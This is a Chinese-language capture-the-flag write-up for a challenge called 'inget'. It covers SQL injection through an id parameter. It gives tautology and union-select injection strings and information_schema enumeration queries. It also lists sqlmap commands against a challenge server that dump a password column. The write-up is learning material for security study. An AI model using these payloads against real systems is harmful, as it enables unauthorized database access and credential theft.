# inget

知识点：sql注入
根据提示，有一个参数id，对id进行sql注入尝试
思路：先尝试万能密码注入，接着查库、查表、查列、查数据

1. 构造万能密码和简单构造注入

    注入语句
    ‘~’ 相当于16进制的0x7e
    万能密码 'or ‘1’ ='1
    ’ and ‘1’=‘1
    ’ and 1=2 union select 1,user(),3- -+ 前面加’是为了闭合后面的’
    group_concat(string)

2. 核心语法获取数据库信息
    SQL手工注入方法

    ```sql
    select schema_name from information_schema.schemata（查库）
    select table_name from information_schema.tables where table_schema=库名（查表）
    select column_name from information_schema.colums where table_name=表名（查列）
    select 列名 from 库名.表名（查数据）
    ```

    这道题万能密码’ and ‘1’='1就能爆出flag

两篇学习文章：
https://blog.csdn.net/lza20001103/article/details/124242991
https://blog.csdn.net/FUTEROX/article/details/117754069

## Sqlmap一把梭哈

1. 得到数据库名称

```python
python sqlmap.py -u http://61.147.171.105:49910?id=1 --current-db
```

2. 得到表

```python
python sqlmap.py -u http://61.147.171.105:49910?id=1 -D cyber --tables
```

3. 得到列

```python
python sqlmap.py -u http://61.147.171.105:49910?id=1 -D cyber -T cyber --columns
```

4. 查看对应列的数据

```python
python sqlmap.py -u http://61.147.171.105:49910?id=1 -D cyber -T cyber -C pw --dump
```

`--dump` 选项表示“导出数据”。具体来说，`--dump` 会提取并导出指定表中符合条件的列的所有数据。在这个例子中，它会从数据库 `cyber` 的 `cyber` 表中的 `pw` 列中提取并展示所有数据。